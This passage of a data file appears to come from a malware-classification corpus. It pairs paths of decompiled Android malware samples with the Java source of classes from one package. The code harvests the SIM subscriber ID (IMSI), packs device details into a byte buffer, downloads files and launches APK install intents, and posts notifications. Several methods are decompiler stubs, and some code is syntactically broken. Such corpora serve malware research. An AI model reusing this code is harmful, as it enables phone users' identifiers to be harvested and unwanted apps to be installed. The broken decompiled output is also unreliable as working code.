length4=i8 + bytes4.length;     int i9=length4 + 1;     bArr[length4]=3;     System.arraycopy(g.a((short)this.d.getBytes().length),0,bArr,i9,2);     int i10=i9 + 2;     byte[] bytes5=this.d.getBytes();     System.arraycopy(bytes5,0,bArr,i10,bytes5.length);     int length5=i10 + bytes5.length;     int i11=length5 + 1;     bArr[length5]=4;     String valueOf=String.valueOf(this.e);     System.arraycopy(g.a((short)valueOf.getBytes().length),0,bArr,i11,2);     int i12=i11 + 2;     byte[] bytes6=valueOf.getBytes();     System.arraycopy(bytes6,0,bArr,i12,bytes6.length);     int length6=bytes6.length + i12;     int i13=length6 + 1;     bArr[length6]=5;     String valueOf2=String.valueOf(this.f);     System.arraycopy(g.a((short)valueOf2.getBytes().length),0,bArr,i13,2);     int i14=i13 + 2;     byte[] bytes7=valueOf2.getBytes();     System.arraycopy(bytes7,0,bArr,i14,bytes7.length);     int length7=bytes7.length + i14;     int i15=length7 + 1;     bArr[length7]=6;     byte[] a5=g.a((short)this.g.getBytes().length);     System.arraycopy(a5,0,bArr,i15,a5.length);     int i16=i15 + 2;     byte[] bytes8=this.g.getBytes();     System.arraycopy(bytes8,0,bArr,i16,bytes8.length);     int length8=i16 + bytes8.length;     int i17=length8 + 1;     bArr[length8]=7;     byte[] a6=g.a((short)this.h.getBytes().length);     System.arraycopy(a6,0,bArr,i17,a6.length);     int i18=i17 + 2;     byte[] bytes9=this.h.getBytes();     System.arraycopy(bytes9,0,bArr,i18,bytes9.length);     int length9=i18 + bytes9.length;     int i19=length9 + 1;     bArr[length9]=8;     byte[] a7=g.a((short)4);     System.arraycopy(a7,0,bArr,i19,a7.length);     int i20=i19 + 2;     byte[] a8=g.a(this.i);     System.arraycopy(a8,0,bArr,i20,a8.length);     int length10=i20 + a8.length;     int i21=length10 + 1;     bArr[length10]=9;     byte[] a9=g.a((short)""2.1.2"".getBytes().length);     System.arraycopy(a9,0,bArr,i21,a9.length);     int i22=i21 + 2;     byte[] bytes10=""2.1.2"".getBytes();     System.arraycopy(bytes10,0,bArr,i22,bytes10.length);     int length11=i22 + bytes10.length;     int i23=length11 + 1;     bArr[length11]=11;     byte[] a10=g.a((short)4);     System.arraycopy(a10,0,bArr,i23,a10.length);     int i24=i23 + 2;     byte[] a11=g.a(this.k);     System.arraycopy(a11,0,bArr,i24,a11.length);     int length12=i24 + a11.length;     int i25=length12 + 1;     bArr[length12]=12;     byte[] a12=g.a((short)this.l.getBytes().length);     System.arraycopy(a12,0,bArr,i25,a12.length);     int i26=i25 + 2;     byte[] bytes11=this.l.getBytes();     System.arraycopy(bytes11,0,bArr,i26,bytes11.length);     int length13=i26 + bytes11.length;     int i27=length13 + 1;     bArr[length13]=14;     byte[] a13=g.a((short)this.n.getBytes().length);     System.arraycopy(a13,0,bArr,i27,a13.length);     int i28=i27 + 2;     byte[] bytes12=this.n.getBytes();     System.arraycopy(bytes12,0,bArr,i28,bytes12.length);     int length14=i28 + bytes12.length;     int i29=length14 + 1;     bArr[length14]=15;     byte[] a14=g.a((short)this.o.getBytes().length);     System.arraycopy(a14,0,bArr,i29,a14.length);     int i30=i29 + 2;     byte[] bytes13=this.o.getBytes();     System.arraycopy(bytes13,0,bArr,i30,bytes13.length);     int length15=i30 + bytes13.length;     int i31=length15 + 1;     bArr[length15]=16;     byte[] a15=g.a((short)4);     System.arraycopy(a15,0,bArr,i31,a15.length);     int i32=i31 + 2;     byte[] a16=g.a(this.p);     System.arraycopy(a16,0,bArr,i32,a16.length);     int length16=i32 + a16.length;     int i33=length16 + 1;     bArr[length16]=17;     byte[] a17=g.a((short)4);     System.arraycopy(a17,0,bArr,i33,a17.length);     int i34=i33 + 2;     byte[] a18=g.a(this.q);     System.arraycopy(a18,0,bArr,i34,a18.length);     int length17=i34 + a18.length;     if (this.r != null && !"""".equals(this.r)) {       int i35=length17 + 1;       bArr[length17]=18;       byte[] a19=g.a((short)this.r.getBytes().length);       System.arraycopy(a19,0,bArr,i35,a19.length);       int i36=i35 + 2;       byte[] bytes14=this.r.getBytes();       System.arraycopy(bytes14,0,bArr,i36,bytes14.length);       length17=i36 + bytes14.length;     }     int i37=length17 + 1;     bArr[length17]=19;     byte[] a20=g.a((short)this.s.getBytes().length);     System.arraycopy(a20,0,bArr,i37,a20.length);     int i38=i37 + 2;     byte[] bytes15=this.s.getBytes();     System.arraycopy(bytes15,0,bArr,i38,bytes15.length);     int length18=i38 + bytes15.length;     int i39=length18 + 1;     bArr[length18]=100;     byte[] a21=g.a((short)this.t.getBytes().length);     System.arraycopy(a21,0,bArr,i39,a21.length);     int i40=i39 + 2;     byte[] bytes16=this.t.getBytes();     System.arraycopy(bytes16,0,bArr,i40,bytes16.length);     int length19=i40 + bytes16.length;     int i41=length19 + 1;     bArr[length19]=20;     byte[] a22=g.a((short)4);     System.arraycopy(a22,0,bArr,i41,a22.length);     int i42=i41 + 2;     byte[] a23=g.a(this.u);     System.arraycopy(a23,0,bArr,i42,a23.length);     int length20=i42 + a23.length;     return bArr;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\at.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a0e3aae"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\au.code","public class au extends BaseAdapter implements View.OnClickListener {   private List f92a;   private n b;   private Context c;   private Handler d=new av(this);   private aw e=null;   public au(  Context context,  List list){     this.f92a=new ArrayList();     this.c=context;     this.f92a=list;   }   @Override public int getCount(){     return this.f92a.size();   }   @Override public Object getItem(  int i){     return this.f92a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     TextView textView;     TextView textView2;     ImageView imageView;     Bitmap a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(this.c,5);     Drawable a3=a2 != null ? com.apkmore.rbjatnldymzfiw.j.d.a.a(this.c,a2) : null;     ax axVar=(ax)view;     if (axVar == null) {       axVar=new ax(this,this.c);     }     if (""mounted"".equals(Environment.getExternalStorageState())) {       String str=Environment.getExternalStorageDirectory() + ""/"" + h.j+ ((ad)this.f92a.get(i)).e+ ""/""+ h.aB+ h.s;       if (new File(str).exists()) {         a3=com.apkmore.rbjatnldymzfiw.j.d.e.c(this.c,str);       }  else {         this.b=new n(this.c,(ad)this.f92a.get(i),this.d);         com.apkmore.rbjatnldymzfiw.j.b.h hVar=new com.apkmore.rbjatnldymzfiw.j.b.h(((ad)this.f92a.get(i)).k,ay.b(this.c,h.aB + h.s,((ad)this.f92a.get(i)).e),0);         hVar.a((Object)(-1));         aq.a(this.c,hVar,this.b);       }     }     if (a3 != null) {       imageView=axVar.b;       imageView.setImageDrawable(a3);     }     textView=axVar.c;     textView.setText(((ad)this.f92a.get(i)).d);     textView2=axVar.d;     textView2.setText(((ad)this.f92a.get(i)).h);     if (i % 2 != 0) {       axVar.a();     }     return axVar;   }   @Override public void onClick(  View view){     at a2=ay.a((ad)this.f92a.get(((Integer)view.getTag()).intValue()));     if (this.e != null) {       this.e.a(a2);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\av.code","public class av extends Handler {   final au f93a;   public av(  au auVar){     this.f93a=auVar;   }   @Override public void handleMessage(  Message message){     Context context;     Bundle data=message.getData();     int i=data.getInt(h.aE);     String string=data.getString(h.aC);     if (string != null) {       context=this.f93a.c;       if (ay.a(context,string,false) == null || i != -1) {         return;       }       this.f93a.notifyDataSetChanged();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\aw.code","public interface aw {   void a(  at atVar); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ax.code","public class ax extends LinearLayout {   final au f94a;   private ImageView b;   private TextView c;   private TextView d;   private ImageView e;   public ax(  au auVar,  Context context){     super(context);     this.f94a=auVar;     setOrientation(1);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     addView(linearLayout,new LinearLayout.LayoutParams(-1,-2));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout.setOrientation(0);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.weight=1.0f;     int a2=ay.a(context,7);     layoutParams.bottomMargin=a2;     layoutParams.topMargin=a2;     linearLayout.addView(linearLayout2,layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     int a3=ay.a(context,5);     layoutParams2.rightMargin=a3;     layoutParams2.leftMargin=a3;     this.b=new ImageView(context);     linearLayout2.addView(this.b,layoutParams2);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-2,-2);     layoutParams3.leftMargin=ay.a(context,2);     linearLayout2.addView(linearLayout3,layoutParams3);     this.c=new TextView(context);     this.c.setGravity(17);     this.c.setTextSize(12.0f);     this.c.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.c.setSingleLine();     this.c.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.c,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-2,-2);     this.d=new TextView(context);     this.d.setGravity(17);     this.d.setTextSize(12.0f);     this.d.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.d.setSingleLine();     this.d.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.d,layoutParams4);     ImageView imageView=new ImageView(context);     imageView.setBackgroundColor(-4604739);     addView(imageView,new LinearLayout.LayoutParams(-1,1));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));   }   public void a(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ay.code","public class ay {   protected static int f95a=-99;   private static Object g=new Object();   private static final String h=h.o;   private static final Pattern i=Pattern.compile(h.ba);   protected static final String b=h.aS;   protected static final String c=h.aT;   protected static final String d=h.aU;   protected static final String e=h.aV;   static Object f=new Object();   private static Object j=new Object();   public static int a(){     String[] list;     int i2=0;     if (""mounted"".equals(Environment.getExternalStorageState())) {       File file=new File(Environment.getExternalStorageDirectory(),h.j);       if (file.exists() && (list=file.list()) != null) {         for (        String str : list) {           try {             if (Integer.valueOf(str).intValue() != 121) {               i2=a(i2);             }           }  catch (          Exception e2) {           }         }       }     }     return i2;   }   public static int a(  int i2){     int i3=i2 + 1;     return i2;   }   public static int a(  Context context){     return 100061;   }   public static int a(  Context context,  int i2){     return (int)((context.getResources().getDisplayMetrics().density * i2) + 0.5f);   }   public static int a(  Context context,  String str,  int i2){     BufferedReader bufferedReader;     BufferedReader bufferedReader2=null;     try {       bufferedReader=new BufferedReader(new InputStreamReader(context.getAssets().open(str,3)));       try {         i2=Integer.valueOf(bufferedReader.readLine()).intValue();         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e2) {           }         }       }  catch (      Exception e3) {         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e4) {           }         }         return i2;       } catch (      Throwable th) {         bufferedReader2=bufferedReader;         th=th;         if (bufferedReader2 != null) {           try {             bufferedReader2.close();           }  catch (          IOException e5) {           }         }         throw th;       }     }  catch (    Exception e6) {       bufferedReader=null;     } catch (    Throwable th2) {       th=th2;     }     return i2;   }   protected static final int a(  Context context,  String str,  String str2){     try {       for (      Class<?> cls : Class.forName(context.getPackageName() + h.aY).getDeclaredClasses()) {         if (str.equals(cls.getSimpleName())) {           return cls.getDeclaredField(str2).getInt(cls.newInstance());         }       }     }  catch (    ClassNotFoundException e2) {     } catch (    IllegalAccessException e3) {     } catch (    InstantiationException e4) {     } catch (    NoSuchFieldException e5) {     } catch (    SecurityException e6) {     }     return -1;   }   public static Intent a(  Context context,  File file,  int i2){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),h.cc);     intent.addFlags(268435456);     return intent;   }   public static Intent a(  Context context,  File file,  boolean z){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),h.cc);     intent.addFlags(268435456);     return intent;   }   public static Intent a(  Context context,  String str,  PackageManager packageManager){     ResolveInfo resolveInfo;     if (str == null || str.trim().length() == 0) {       return null;     }     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,0);     if (queryIntentActivities != null) {       int size=queryIntentActivities.size();       for (int i2=0; i2 < size; i2++) {         resolveInfo=queryIntentActivities.get(i2);         if (str.equals(resolveInfo.activityInfo.packageName)) {           break;         }       }     }     resolveInfo=null;     if (resolveInfo == null) {       return null;     }     ComponentName componentName=new ComponentName(str,resolveInfo.activityInfo.name);     Intent intent2=new Intent();     intent2.setComponent(componentName);     a(intent2);     return intent2;   }   public static Bitmap a(  Context context,  String str,  boolean z){     if (str == null) {       return null;     }     if (z) {       try {         return BitmapFactory.decodeStream(context.getAssets().open(str));       }  catch (      Exception e2) {         return null;       }     }     try {       return BitmapFactory.decodeStream(new FileInputStream(str));     }  catch (    FileNotFoundException e3) {       return null;     } catch (    Exception e4) {       return null;     }   }   public static Bitmap a(  Bitmap bitmap,  Bitmap bitmap2){     Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),bitmap.getConfig());     Paint paint=new Paint();     Canvas canvas=new Canvas(createBitmap);     canvas.drawBitmap(bitmap,0.0f,0.0f,paint);     canvas.drawBitmap(bitmap2,0.0f,r1 - bitmap2.getHeight(),paint);     return createBitmap;   }   protected static ImageView a(  View view){     if (view instanceof ImageView) {       return (ImageView)view;     }     if (view instanceof ViewGroup) {       int i2=0;       while (true) {         int i3=i2;         if (i3 >= ((ViewGroup)view).getChildCount()) {           break;         }         View childAt=((ViewGroup)view).getChildAt(i3);         if (childAt instanceof ImageView) {           return (ImageView)childAt;         }         if (childAt instanceof ViewGroup) {           return a(childAt);         }         i2=i3 + 1;       }     }     return null;   }   public static ad a(  at atVar){     if (atVar == null) {       return null;     }     ad adVar=new ad();     adVar.e=atVar.h;     adVar.d=atVar.g;     adVar.f=atVar.i;     adVar.i=atVar.o * 1024;     adVar.h=atVar.n;     adVar.j=atVar.p;     adVar.n=atVar.t == 1;     adVar.o=atVar.w == 1;     adVar.f80a=atVar.b;     adVar.l=atVar.r;     adVar.q=atVar.E == 1;     adVar.k=atVar.q;     adVar.p=atVar.x;     adVar.r=atVar.G;     adVar.m=atVar.s == 1;     adVar.g=atVar.m;     adVar.y=2;     adVar.b=atVar.d;     adVar.z=atVar.L;     adVar.A=atVar.M;     adVar.B=atVar.j;     return adVar;   }   public static at a(  Context context,  String str){     if (str == null || str.trim().length() == 0) {       return null;     }     at[] b2=b(context);     if (b2 == null || b2.length <= 0) {       return null;     }     for (    at atVar : b2) {       if (str.equals(atVar.i)) {         return atVar;       }     }     return null;   }   public static at a(  ad adVar){     if (adVar == null) {       return null;     }     at atVar=new at();     atVar.h=adVar.e;     atVar.g=adVar.d;     atVar.i=adVar.f;     atVar.o=adVar.i / 1024;     atVar.n=adVar.h;     atVar.p=adVar.j;     atVar.t=adVar.n ? 1 : 0;     atVar.w=adVar.o ? 1 : 0;     atVar.b=adVar.f80a;     atVar.r=adVar.l;     atVar.E=adVar.q ? 1 : 0;     atVar.q=adVar.k;     atVar.x=adVar.p;     atVar.G=adVar.r;     atVar.s=adVar.m ? 1 : 0;     atVar.m=adVar.g;     atVar.e=(byte)12;     atVar.d=adVar.b;     atVar.L=adVar.z;     atVar.M=adVar.A;     atVar.j=adVar.B;     return atVar;   }   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=c(context,context.getApplicationInfo().packageName,1).activities;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e2) {         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e3) {       return cls;     }   }   public static String a(  double d2,  double d3){     return null;   }   public static String a(  Context context,  PackageManager packageManager){     try {       return packageManager.getApplicationInfo(context.getPackageName(),128).metaData.getString(h.E);     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   private static java.lang.String a(  android.content.Context r5,  java.io.File r6){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.ay.a(android.content.Context, java.io.File):java.lang.String"");   }   protected static String a(  String str){     FileInputStream fileInputStream;     String str2=null;     if (""mounted"".equals(Environment.getExternalStorageState())) {       File file=new File(Environment.getExternalStorageDirectory(),str);       DataInputStream exists=file.exists();       try {         if (exists != 0) {           try {             fileInputStream=new FileInputStream(file);             try {               exists=new DataInputStream(fileInputStream);               try {                 str2=exists.readUTF();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e2) {                     e2.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e3) {                     e3.printStackTrace();                   }                 }               }  catch (              IOException e4) {                 e=e4;                 e.printStackTrace();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e5) {                     e5.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e6) {                     e6.printStackTrace();                   }                 }                 return str2;               }             }  catch (            IOException e7) {               e=e7;               exists=0;             } catch (            Throwable th) {               exists=0;               th=th;               if (exists != 0) {                 try {                   exists.close();                 }  catch (                IOException e8) {                   e8.printStackTrace();                 }               }               if (fileInputStream != null) {                 try {                   fileInputStream.close();                 }  catch (                IOException e9) {                   e9.printStackTrace();                 }               }               throw th;             }           }  catch (          IOException e10) {             e=e10;             exists=0;             fileInputStream=null;           } catch (          Throwable th2) {             exists=0;             fileInputStream=null;             th=th2;           }         }       }  catch (      Throwable th3) {         th=th3;       }     }     return str2;   }   protected static String a(  String str,  int i2){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     File file=new File(Environment.getExternalStorageDirectory(),h.j + i2 + ""/""+ str);     if (file.exists()) {       return file.getPath();     }     return null;   }   public static void a(  long j2){     b(h.j + h.A,String.valueOf(j2));   }   public static void a(  Context context,  Intent intent,  int i2,  at atVar,  int i3,  boolean z,  boolean z2){     ImageView a2;     int i4=400000 + atVar.h;     String str=atVar.I == 1 ? ((Object)context.getApplicationContext().getApplicationInfo().loadLabel(context.getPackageManager())) + h.cR + ""ï¼š""+ atVar.b : atVar.b;     NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");     if (z2) {       notificationManager.cancel(i4);       return;     }     Notification notification=new Notification(i2,atVar.m,System.currentTimeMillis());     PendingIntent activity=PendingIntent.getActivity(context,i4,intent,134217728);     int a3=a(context,h.as,h.ar);     int a4=a(context,h.ap,h.aB);     int a5=a(context,h.ap,h.cd);     int a6=a(context,h.ap,h.aq);     int a7=a(context,h.ap,h.at);     Bitmap a8=a(context,a(h.aB + h.s,atVar.h),false);     if (a3 == -1 || a6 == -1 || a4 == -1 || a5 == -1 || a7 == -1 || a8 == null) {       notification.setLatestEventInfo(context,atVar.m,str,activity);       try {         View inflate=LayoutInflater.from(context).inflate(notification.contentView.getLayoutId(),(ViewGroup)null);         if (inflate != null && (a2=a(inflate)) != null && a8 != null) {           notification.contentView.setImageViewBitmap(a2.getId(),a8);         }       }  catch (      Exception e2) {       }     }  else {       notification.contentIntent=activity;       RemoteViews remoteViews=new RemoteViews(context.getPackageName(),a3);       notification.contentView=remoteViews;       remoteViews.setImageViewBitmap(a4,a8);       remoteViews.setTextViewText(a5,Html.fromHtml(""<"" + h.Z + "">""+ atVar.m+ ""</""+ h.Z+ "">""));       remoteViews.setTextViewText(a6,str);       remoteViews.setTextViewText(a7,new SimpleDateFormat(""H:mm"").format(new Date()));     }     if (i3 != f95a) {       notification.flags=i3;     }     if (z) {       notification.defaults|=4;       notification.flags|=1;       notification.ledARGB=-16711936;       notification.ledOnMS=500;       notification.ledOffMS=2000;     }     notificationManager.notify(i4,notification);   }   private static void a(  android.content.Context r5,  java.io.File r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.ay.a(android.content.Context, java.io.File, java.lang.String):void"");   }   public static void a(  Context context,  String str,  String str2,  int i2){     if (str == null || """".equals(str) || str2 == null || """".equals(str2)) {       return;     }     context.startActivity(a(context,new File(str),i2));   }   public static void a(  Context context,  String str,  String str2,  boolean z){     if (str == null || """".equals(str) || str2 == null || """".equals(str2)) {       return;     }     context.startActivity(a(context,new File(str),z));   }   private static void a(  Intent intent){     intent.addFlags(268435456);   }   private static void a(  String[] strArr,  Iterator it,  int i2){     strArr[i2]=(String)it.next();   }   private static boolean a(  Context context,  int i2,  int i3){     if (i3 == -1) {       return false;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(h.h,0);     SharedPreferences.Editor edit=sharedPreferences.edit();     for (    String str : sharedPreferences.getAll().keySet()) {       if (String.valueOf(i2).equals(str)) {         edit.putString(str,sharedPreferences.getString(str,"""") + """" + i3+ "","");         return edit.commit();       }     }     edit.putString("""" + i2,i3 + "","");     return edit.commit();   }   public static synchronized boolean a(  Context context,  ad adVar){     boolean z=false; synchronized (ay.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(h.c,0).edit();       if (edit.commit()) {         edit.putString("""" + adVar.e,adVar.a());         if (edit.commit()) {           z=true;         }       }     }     return z;   }   public static boolean a(  Context context,  at atVar){     int i2=0;     SharedPreferences sharedPreferences=context.getSharedPreferences(h.f,0);     c(context,atVar.y);     if (atVar.h == -1) {       return false;     }     while (sharedPreferences.contains("""" + i2)) {       i2++;     }     atVar.f=i2;     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putString("""" + i2,atVar.a());     return edit.commit();   }   public static boolean a(  Context context,  String str,  int i2,  boolean z){     if (""mounted"".equals(Environment.getExternalStorageState())) {       return new File(Environment.getExternalStorageDirectory(),h.j + i2 + ""/""+ str).delete();     }     return false;   }   public static String[] a(  String str,  String str2){     int i2=0;     if (str == null || str.equals("""") || str2 == null || str2.equals("""")) {       return null;     }     ArrayList arrayList=new ArrayList();     int i3=0;     while (true) {       int indexOf=str.indexOf(str2,i3);       if (indexOf == -1) {         break;       }       arrayList.add(str.substring(i3,indexOf));       i3=str2.length() + indexOf;     }     if (str.length() > i3) {       arrayList.add(str.substring(i3));     }     String[] strArr=new String[arrayList.size()];     ListIterator listIterator=arrayList.listIterator();     while (listIterator.hasNext()) {       a(strArr,listIterator,i2);       i2++;     }     return strArr;   }   public static long b(){     long j2;     try {       j2=Long.valueOf(a(h.j + h.A)).longValue();     }  catch (    Exception e2) {       j2=-1;     }     if (j2 == -1) {       return 60L;     }     return j2;   }   public static at b(  Context context,  String str){     if (str == null || str.trim().length() == 0) {       return null;     }     at[] b2=b(context);     if (b2 == null || b2.length <= 0) {       return null;     }     for (    at atVar : b2) {       if (str.equals(atVar.d)) {         return atVar;       }     }     return null;   }   public static File b(  Context context,  String str,  int i2){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     String str2=h.j + i2;     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     return new File(Environment.getExternalStorageDirectory(),str2 + ""/"" + str);   }   public static Class b(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=c(context,context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e2) {           e2.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e3) {       e3.printStackTrace();       return cls;     }   }   private static String b(  Context context,  File file){     String subscriberId=((TelephonyManager)context.getSystemService(""phone"")).getSubscriberId();     SharedPreferences sharedPreferences=context.getSharedPreferences(h.l,0);     String string=sharedPreferences.getString(""i"",null);     if (string != null && !"""".equals(string)) {       String d2=d(string);       return !e(d2) ? """" : d2;     }     if (e(subscriberId)) {       j(context,subscriberId);       a(context,file,subscriberId);       return subscriberId;     }     if (sharedPreferences != null) {       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(""i"","""");       edit.commit();     }     return """";   }   public static String b(  at atVar){     String substring=atVar.d.substring(atVar.d.lastIndexOf(""/"") + 1);     substring.trim();     return substring.endsWith(""?"") ? substring.substring(0,substring.length() - 1) : substring;   }   public static void b(  long j2){     b(h.j + h.v,String.valueOf(j2));   }   public static void b(  Context context,  ad adVar){     SharedPreferences.Editor edit=context.getSharedPreferences(h.c,0).edit();     edit.putString("""" + adVar.e,adVar.a());     edit.remove("""" + adVar.e);     edit.commit();   }   public static boolean b(  Context context,  int i2){     boolean commit; synchronized (g) {       SharedPreferences.Editor edit=context.getSharedPreferences(h.n,0).edit();       edit.putInt(h.bH,i2);       commit=edit.commit();     }     return commit;   }   public static boolean b(  Context context,  at atVar){     at[] b2;     if (atVar == null) {       return false;     }     if (atVar.l.intValue() != 3) {       a(context,atVar.h,atVar.l.intValue());     }     SharedPreferences sharedPreferences=context.getSharedPreferences(h.f,0);     String str="""" + atVar.f;     if (!sharedPreferences.contains(str) || (b2=b(context)) == null) {       return false;     }     for (    at atVar2 : b2) {       if (atVar2.f == atVar.f) {         if (atVar2.l.intValue() == 3) {           return false;         }         if (atVar2.l.intValue() >= atVar.l.intValue() && (atVar.l.intValue() != 3 || atVar2.l.intValue() != 4)) {           return false;         }         SharedPreferences.Editor edit=sharedPreferences.edit();         edit.remove(str);         edit.putString(str,atVar.a());         if (atVar.l.intValue() == 3) {           a(context,atVar.h,atVar.l.intValue());         }         return edit.commit();       }     }     return false;   }   public static boolean b(  String str){     if (str == null || """".equals(str)) {       return false;     }     return b(h.j + h.w,str);   }   public static boolean b(  java.lang.String r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.ay.b(java.lang.String, java.lang.String):boolean"");   }   public static at[] b(  Context context){     int i2=0;     SharedPreferences sharedPreferences=context.getSharedPreferences(h.f,0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     at[] atVarArr=new at[all.size()];     while (true) {       int i3=i2;       if (!it.hasNext()) {         return atVarArr;       }       String next=it.next();       String string=sharedPreferences.getString(next,null);       at atVar=new at();       if (!atVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       atVar.f=Integer.valueOf(next).intValue();       i2=i3 + 1;       atVarArr[i3]=atVar;     }   }   public static int c(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(h.g,0);     if (sharedPreferences.getInt(h.X,1) == 1) {       return 0;     }     Calendar calendar=Calendar.getInstance();     calendar.setTimeInMillis(System.currentTimeMillis());     String str=calendar.get(1) + ""-"" + calendar.get(2)+ ""-""+ calendar.get(5);     if (str.equals(sharedPreferences.getString(h.au,str))) {       return sharedPreferences.getString(h.Y,null) != null ? 2 : -1;     }     return 1;   }   public static long c(){     long j2;     try {       j2=Long.valueOf(a(h.j + h.v)).longValue();     }  catch (    Exception e2) {       j2=-1;     }     if (j2 == -1) {       return 0L;     }     return j2;   }   public static PackageInfo c(  Context context,  String str,  int i2){     return context.getPackageManager().getPackageInfo(str,i2);   }   public static Class c(  Context context,  Class cls){     Class<?> cls2;     try {       ServiceInfo[] serviceInfoArr=c(context,context.getApplicationInfo().packageName,4).services;       if (serviceInfoArr == null) {         return cls;       }       for (      ServiceInfo serviceInfo : serviceInfoArr) {         try {           cls2=Class.forName(serviceInfo.name);         }  catch (        ClassNotFoundException e2) {           e2.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e3) {       e3.printStackTrace();       return cls;     }   }   protected static String c(  String str){     try {       byte[] bytes=str.getBytes(h.aZ);       byte[] bytes2=h.getBytes();       StringBuilder sb=new StringBuilder();       for (int i2=0; i2 < bytes.length; i2++) {         sb.append(""%"" + ((bytes[i2] & 255) + (bytes2[i2 % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e2) {       e2.printStackTrace();       return str;     }   }   public static void c(  Context context,  at atVar){     File file;     int i2=atVar.o / 1024;     if (((int)d()) > i2) {       file=b(context,atVar.i + h.aH,atVar.h);     }  else {       if (e() <= i2) {         Toast.makeText(context,h.cq,3000).show();         return;       }       file=new File(h.r + context.getPackageName() + ""/""+ atVar.i+ h.aH);       File parentFile=file.getParentFile();       if (!parentFile.exists()) {         parentFile.mkdirs();       }     }     com.apkmore.rbjatnldymzfiw.j.b.h hVar=new com.apkmore.rbjatnldymzfiw.j.b.h(atVar.d,file,1);     if 